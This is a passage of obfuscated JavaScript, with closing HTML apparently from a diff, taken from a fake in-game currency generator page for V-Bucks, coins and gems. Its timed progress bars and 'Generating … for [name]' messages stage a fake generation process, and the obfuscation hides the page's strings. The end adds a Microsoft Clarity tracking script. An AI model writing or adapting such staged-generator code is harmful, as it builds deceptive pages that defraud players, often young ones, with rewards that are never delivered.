_0x239c9e=_0x368145;document[_0x239c9e(0x1b8)](_0x239c9e(0x1a2))[_0x239c9e(0x184)][_0x239c9e(0x187)]=_0x239c9e(0x19f);},0x64);}function _0x16e2(_0x494621,_0xa7a42e){var _0x4351a5=_0x4351();return _0x16e2=function(_0x16e254,_0x2de459){_0x16e254=_0x16e254-0x17c;var _0x38eede=_0x4351a5[_0x16e254];return _0x38eede;},_0x16e2(_0x494621,_0xa7a42e);}document[_0x3c43b5(0x1b8)]('platform0')[_0x3c43b5(0x1bb)](_0x3c43b5(0x1b3),device_click),document['getElementById']('platform1')['addEventListener'](_0x3c43b5(0x1b3),device_click),document['getElementById'](_0x3c43b5(0x1ae))[_0x3c43b5(0x1bb)](_0x3c43b5(0x1b3),device_click);function VBucksSelected(_0x47b6af,_0x536ed2){var _0x271552=_0x3c43b5;vbucksValue=_0x536ed2,document[_0x271552(0x1b8)](_0x271552(0x193))[_0x271552(0x185)][_0x271552(0x18d)](_0x271552(0x19a)),document['getElementById'](_0x271552(0x1ad))[_0x271552(0x185)][_0x271552(0x18d)](_0x271552(0x19a)),document[_0x271552(0x1b8)](_0x271552(0x17f))[_0x271552(0x185)][_0x271552(0x18d)](_0x271552(0x19a)),document[_0x271552(0x1b8)](_0x271552(0x17e))[_0x271552(0x185)][_0x271552(0x18d)](_0x271552(0x19a)),document['getElementById'](_0x271552(0x193))['classList']['remove']('Selected'),document[_0x271552(0x1b8)](_0x271552(0x1ad))[_0x271552(0x185)]['remove'](_0x271552(0x182)),document[_0x271552(0x1b8)](_0x271552(0x17f))[_0x271552(0x185)][_0x271552(0x1ac)](_0x271552(0x182)),document[_0x271552(0x1b8)](_0x271552(0x17e))[_0x271552(0x185)][_0x271552(0x1ac)]('Selected'),document[_0x271552(0x1b8)](_0x47b6af)['classList'][_0x271552(0x18d)](_0x271552(0x182)),document[_0x271552(0x1b8)](_0x47b6af)[_0x271552(0x185)][_0x271552(0x1ac)](_0x271552(0x19a));}function VBucksSelected2(_0x35fb4a,_0x26b498){var _0x2fd110=_0x3c43b5;vbucksValue2=_0x26b498,document[_0x2fd110(0x1b8)](_0x2fd110(0x1b1))[_0x2fd110(0x185)][_0x2fd110(0x18d)]('VBucks2'),document['getElementById'](_0x2fd110(0x1b9))[_0x2fd110(0x185)]['add'](_0x2fd110(0x17f)),document['getElementById']('VBucks6')[_0x2fd110(0x185)]['add'](_0x2fd110(0x17f)),document['getElementById'](_0x2fd110(0x1b6))[_0x2fd110(0x185)][_0x2fd110(0x18d)]('VBucks2'),document[_0x2fd110(0x1b8)]('VBucks4')[_0x2fd110(0x185)][_0x2fd110(0x1ac)](_0x2fd110(0x186)),document[_0x2fd110(0x1b8)](_0x2fd110(0x1b9))[_0x2fd110(0x185)]['remove'](_0x2fd110(0x186)),document[_0x2fd110(0x1b8)](_0x2fd110(0x1a3))[_0x2fd110(0x185)][_0x2fd110(0x1ac)](_0x2fd110(0x186)),document[_0x2fd110(0x1b8)]('VBucks7')[_0x2fd110(0x185)][_0x2fd110(0x1ac)](_0x2fd110(0x186)),document[_0x2fd110(0x1b8)](_0x35fb4a)[_0x2fd110(0x185)][_0x2fd110(0x18d)](_0x2fd110(0x186)),document[_0x2fd110(0x1b8)](_0x35fb4a)[_0x2fd110(0x185)][_0x2fd110(0x1ac)]('VBucks2');}function cointocash(){var _0x4453f2=_0x3c43b5;document['getElementById'](_0x4453f2(0x1b5))[_0x4453f2(0x184)][_0x4453f2(0x187)]='none',document[_0x4453f2(0x1b8)]('step1-1')[_0x4453f2(0x184)][_0x4453f2(0x187)]='block';}function GenerateButton(){var _0x3de41b=_0x3c43b5;document[_0x3de41b(0x1b8)](_0x3de41b(0x1a0))[_0x3de41b(0x184)][_0x3de41b(0x187)]=_0x3de41b(0x1a5),document['getElementById'](_0x3de41b(0x1b7))[_0x3de41b(0x184)][_0x3de41b(0x187)]=_0x3de41b(0x1a5),document[_0x3de41b(0x1b8)](_0x3de41b(0x180))[_0x3de41b(0x184)][_0x3de41b(0x187)]=_0x3de41b(0x19f),setTimeout(function(){var _0x169abc=_0x3de41b;document['getElementById'](_0x169abc(0x197))['classList'][_0x169abc(0x18d)](_0x169abc(0x19b)),setTimeout(function(){var _0x12e380=_0x169abc;document[_0x12e380(0x1b8)](_0x12e380(0x198))[_0x12e380(0x1a9)]='Generating\x20'+vbucksValue+'\x20Coins\x20and\x20'+vbucksValue2+'\x20Gems\x20for\x20'+name+'',document['getElementById'](_0x12e380(0x197))['classList'][_0x12e380(0x18d)](_0x12e380(0x1a6)),setTimeout(function(){var _0x4e86c2=_0x12e380;document[_0x4e86c2(0x1b8)](_0x4e86c2(0x198))[_0x4e86c2(0x1a9)]=_0x4e86c2(0x188),document['getElementById'](_0x4e86c2(0x197))['classList'][_0x4e86c2(0x18d)]('progressbar75'),setTimeout(function(){var _0x2dad06=_0x4e86c2;document['getElementById'](_0x2dad06(0x198))[_0x2dad06(0x1a9)]=_0x2dad06(0x195),document[_0x2dad06(0x1b8)](_0x2dad06(0x197))[_0x2dad06(0x185)][_0x2dad06(0x18d)](_0x2dad06(0x196)),document[_0x2dad06(0x1b8)](_0x2dad06(0x18a))['style'][_0x2dad06(0x187)]='inline-block',setTimeout(function(){var _0xea7f98=_0x2dad06;document[_0xea7f98(0x1b8)](_0xea7f98(0x1a2))[_0xea7f98(0x184)][_0xea7f98(0x187)]=_0xea7f98(0x1a5),setTimeout(function(){var _0x3c46bb=_0xea7f98;document[_0x3c46bb(0x1b8)](_0x3c46bb(0x18f))['style'][_0x3c46bb(0x187)]=_0x3c46bb(0x19f),document['getElementById'](_0x3c46bb(0x199))[_0x3c46bb(0x1a9)]=vbucksValue,document[_0x3c46bb(0x1b8)](_0x3c46bb(0x190))[_0x3c46bb(0x1a9)]=name,document[_0x3c46bb(0x1b8)]('vbucksamount1')[_0x3c46bb(0x1a9)]=vbucksValue,document[_0x3c46bb(0x1b8)](_0x3c46bb(0x191))[_0x3c46bb(0x1a9)]=vbucksValue2,document[_0x3c46bb(0x1b8)](_0x3c46bb(0x1b2))['innerHTML']=vbucksValue2;},0x64);},0xbb8);},0xbb8);},0x1388);},0xfa0);},0x3e8);}
+</script>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "m1nuq97y25");
+</script>
+</body>
+</html>
